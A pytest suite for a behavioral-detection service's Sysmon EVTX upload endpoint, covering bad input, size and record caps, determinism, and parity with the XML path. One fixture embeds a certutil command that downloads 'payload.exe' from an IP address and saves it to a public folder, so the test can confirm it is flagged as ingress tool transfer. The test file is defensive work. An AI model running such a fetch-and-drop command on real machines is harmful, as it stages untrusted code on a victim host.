"""P2 Slice-3 · EVTX binary transport — focused tests (ADR-0010s).

Coverage:
  A. Base64 decode error → 400 evtx_bad_base64
  B. Empty payload → 400 empty_input
  C. Wrong magic → 400 evtx_bad_magic
  D. Oversized payload → 413 evtx_payload_too_large
  E. Record-count cap fail-loud → 413 evtx_record_cap_exceeded
  F. Real EVTX header + malformed body → 400 evtx_walk_error
  G. Round-trip via mocked Evtx.records() — canonical evidence from EVTX
     transport is byte-identical to the equivalent XML path.
  H. Determinism — same EVTX bytes produce identical response twice.
  I. Transport layer emits NO new ATT&CK technique on its own.
"""
from __future__ import annotations
import base64
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from fastapi.testclient import TestClient   # noqa: E402
from server import app                       # noqa: E402
from deps import get_current_user            # noqa: E402


@pytest.fixture
def client():
    async def _fake_user():
        return {"email": "test@nivxray.com", "role": "admin"}
    app.dependency_overrides[get_current_user] = _fake_user
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides.pop(get_current_user, None)


def _post_evtx(client, raw_bytes):
    return client.post("/api/behavioral/sysmon/evtx",
                        json={"evtx_base64": base64.b64encode(raw_bytes).decode()})


def _sysmon_event1_xml(*, image, cmdline, proc_guid,
                        pid="4242", time="2026-08-12T10:00:00Z"):
    return (
        "<?xml version=\"1.1\" encoding=\"utf-8\" standalone=\"yes\" ?>\n"
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        f"<System><EventID>1</EventID><TimeCreated SystemTime='{time}'/>"
        "<Computer>WKS-04</Computer></System>"
        f"<EventData><Data Name='UtcTime'>{time}</Data>"
        f"<Data Name='ProcessGuid'>{proc_guid}</Data>"
        f"<Data Name='ProcessId'>{pid}</Data>"
        f"<Data Name='Image'>{image}</Data>"
        f"<Data Name='CommandLine'>{cmdline}</Data>"
        f"<Data Name='User'>CONTOSO\\alice</Data>"
        "<Data Name='LogonId'>0x3E7</Data>"
        "<Data Name='IntegrityLevel'>Medium</Data>"
        "<Data Name='ParentImage'>C:\\Windows\\explorer.exe</Data>"
        "<Data Name='ParentProcessId'>1024</Data>"
        "</EventData></Event>"
    )


def _sysmon_event3_xml(*, image, proc_guid, dst_ip,
                        dst_port="80", protocol="tcp", initiated="true",
                        time="2026-08-12T10:00:01Z"):
    return (
        "<?xml version=\"1.1\" encoding=\"utf-8\" standalone=\"yes\" ?>\n"
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        f"<System><EventID>3</EventID><TimeCreated SystemTime='{time}'/>"
        "<Computer>WKS-04</Computer></System>"
        f"<EventData><Data Name='UtcTime'>{time}</Data>"
        f"<Data Name='ProcessGuid'>{proc_guid}</Data>"
        f"<Data Name='ProcessId'>4242</Data>"
        f"<Data Name='Image'>{image}</Data>"
        f"<Data Name='Protocol'>{protocol}</Data>"
        f"<Data Name='Initiated'>{initiated}</Data>"
        f"<Data Name='DestinationIp'>{dst_ip}</Data>"
        f"<Data Name='DestinationPort'>{dst_port}</Data>"
        "</EventData></Event>"
    )


class _FakeRecord:
    def __init__(self, xml_text): self._xml = xml_text
    def xml(self): return self._xml


class _FakeEvtxLog:
    def __init__(self, records): self._records = records
    def __enter__(self): return self
    def __exit__(self, *a): return False
    def records(self):
        for r in self._records:
            yield r


# ---------------------------------------------------------------------------
# A · Bad base64 → 400
# ---------------------------------------------------------------------------
def test_bad_base64(client):
    r = client.post("/api/behavioral/sysmon/evtx",
                     json={"evtx_base64": "!!!not-base64!!!"})
    assert r.status_code == 400
    assert r.json()["detail"]["error"] == "evtx_bad_base64"


# ---------------------------------------------------------------------------
# B · Empty payload → 400
# ---------------------------------------------------------------------------
def test_empty_payload(client):
    r = _post_evtx(client, b"")
    assert r.status_code == 400
    assert r.json()["detail"]["error"] == "empty_input"


# ---------------------------------------------------------------------------
# C · Wrong magic → 400 evtx_bad_magic
# ---------------------------------------------------------------------------
def test_bad_magic(client):
    r = _post_evtx(client, b"not-an-evtx-header" + b"\x00" * 64)
    assert r.status_code == 400
    assert r.json()["detail"]["error"] == "evtx_bad_magic"


# ---------------------------------------------------------------------------
# D · Oversized payload → 413 evtx_payload_too_large
# ---------------------------------------------------------------------------
def test_oversized_payload(client, monkeypatch):
    monkeypatch.setenv("NIVX_EVTX_MAX_BYTES", "1024")
    # A blob with correct EVTX magic but > 1024 bytes.
    blob = b"ElfFile\x00" + b"\x00" * 2048
    r = _post_evtx(client, blob)
    assert r.status_code == 413
    assert r.json()["detail"]["error"] == "evtx_payload_too_large"


# ---------------------------------------------------------------------------
# E · Record-count cap fail-loud → 413 evtx_record_cap_exceeded
# ---------------------------------------------------------------------------
def test_record_cap_fails_loud(client, monkeypatch):
    monkeypatch.setenv("NIVX_EVTX_MAX_RECORDS", "3")

    fake_records = [_FakeRecord(_sysmon_event1_xml(
        image="C:\\Windows\\System32\\svchost.exe",
        cmdline="svchost.exe -k netsvcs",
        proc_guid=f"{{aaaaaaaa-0000-0000-0000-{i:012d}}}",
    )) for i in range(5)]

    with patch("Evtx.Evtx.Evtx", return_value=_FakeEvtxLog(fake_records)):
        r = _post_evtx(client, b"ElfFile\x00" + b"\x00" * 32)
    assert r.status_code == 413
    assert r.json()["detail"]["error"] == "evtx_record_cap_exceeded"


# ---------------------------------------------------------------------------
# F · Correct magic but junk body → 400 evtx_walk_error
# ---------------------------------------------------------------------------
def test_walk_error_on_corrupt_body(client):
    r = _post_evtx(client, b"ElfFile\x00" + b"\xff" * 1024)
    assert r.status_code == 400
    err = r.json()["detail"]["error"]
    assert err in ("evtx_walk_error", "evtx_record_parse_error",
                    "evtx_no_records"), err


# ---------------------------------------------------------------------------
# G · Round-trip via mocked Evtx.records() — EVTX transport produces
#     canonical evidence byte-identical to the equivalent XML path.
# ---------------------------------------------------------------------------
def test_evtx_round_trip_matches_xml_path(client):
    guid = "{eeeeeeee-0000-0000-0000-000000000001}"
    e1_xml = _sysmon_event1_xml(
        image="C:\\Windows\\System32\\certutil.exe",
        cmdline=("certutil.exe -urlcache -split -f "
                  "http://198.51.100.20/payload.exe C:\\Users\\Public\\upd.exe"),
        proc_guid=guid,
    )
    e3_xml = _sysmon_event3_xml(
        image="C:\\Windows\\System32\\certutil.exe",
        proc_guid=guid,
        dst_ip="198.51.100.20",
    )

    fake_records = [_FakeRecord(e1_xml), _FakeRecord(e3_xml)]
    # (a) EVTX transport path.
    with patch("Evtx.Evtx.Evtx", return_value=_FakeEvtxLog(fake_records)):
        evtx_body = _post_evtx(client, b"ElfFile\x00" + b"\x00" * 32).json()
    # (b) Equivalent XML path — same normalizer, same result modulo the
    # transport-only meta.
    xml_body = client.post("/api/behavioral/sysmon",
        json={"xml": "<Events>" + e1_xml.split("?>", 1)[1]
                     + e3_xml.split("?>", 1)[1] + "</Events>"}).json()

    # Same authoritative MITRE surface
    assert evtx_body["mitre_technique_ids"] == xml_body["mitre_technique_ids"]
    assert {"T1105", "T1140", "T1218"} <= set(evtx_body["mitre_technique_ids"])
    # Same event-count breakdown
    assert evtx_body["event_counts_by_id"] == xml_body["event_counts_by_id"]
    # Same network correlation outcome (RESOLVED via ProcessGuid)
    assert evtx_body["network_evidence"]["connections"][0]["correlation_state"] \
            == xml_body["network_evidence"]["connections"][0]["correlation_state"]
    assert evtx_body["network_evidence"]["connections"][0]["correlation_state"] \
            == "RESOLVED"
    # Same canonical destination IP (transport doesn't touch canonicalization)
    assert evtx_body["network_evidence"]["connections"][0]["destination_ip"] \
            == xml_body["network_evidence"]["connections"][0]["destination_ip"] \
            == "198.51.100.20"
    # EVTX response ALSO carries the transport meta chip
    assert evtx_body["transport"]["transport"] == "sysmon.slice3.evtx@1.0"
    assert evtx_body["transport"]["record_count"] == 2


# ---------------------------------------------------------------------------
# H · Determinism — same EVTX bytes twice → identical response.
# ---------------------------------------------------------------------------
def test_evtx_determinism(client):
    guid = "{ffffffff-0000-0000-0000-000000000002}"
    records = [_FakeRecord(_sysmon_event1_xml(
        image="C:\\Windows\\System32\\svchost.exe",
        cmdline="svchost.exe -k netsvcs",
        proc_guid=guid))]
    blob = b"ElfFile\x00" + b"\x00" * 32

    def _get():
        with patch("Evtx.Evtx.Evtx", return_value=_FakeEvtxLog(records)):
            return _post_evtx(client, blob).json()
    a, b = _get(), _get()
    # Every evidence_ref must match — proves canonical determinism
    # end-to-end from EVTX bytes.
    refs_a = [r["evidence_ref"] for r in a["evidence"]]
    refs_b = [r["evidence_ref"] for r in b["evidence"]]
    assert refs_a == refs_b
    assert a["mitre_technique_ids"] == b["mitre_technique_ids"]


# ---------------------------------------------------------------------------
# I · Transport layer emits NO new ATT&CK technique on its own.
# ---------------------------------------------------------------------------
def test_transport_only_no_new_mitre():
    """Static check — the EVTX transport module must not import the DIE
    catalog or any MITRE mapper. It is a pure wire-format adapter."""
    src = Path("/app/backend/services/behavioral/evtx_reader.py").read_text()
    for banned in ("services.die.api", "die_analyze", "mitre_map",
                    "operations.risk_score", "operations.mitre_map"):
        assert banned not in src, (
            f"EVTX transport imported analysis code — must remain "
            f"transport-only. Found: {banned!r}"
        )


# ---------------------------------------------------------------------------
# J · Slice-3 preserves zero-outbound-lookup discipline (static grep)
# ---------------------------------------------------------------------------
def test_slice3_no_outbound_calls_at_import():
    src = Path("/app/backend/services/behavioral/evtx_reader.py").read_text()
    for banned in ("socket.gethostbyname", "requests.get", "aiohttp",
                    "urllib.request", "dnspython", "resolver.resolve"):
        assert banned not in src
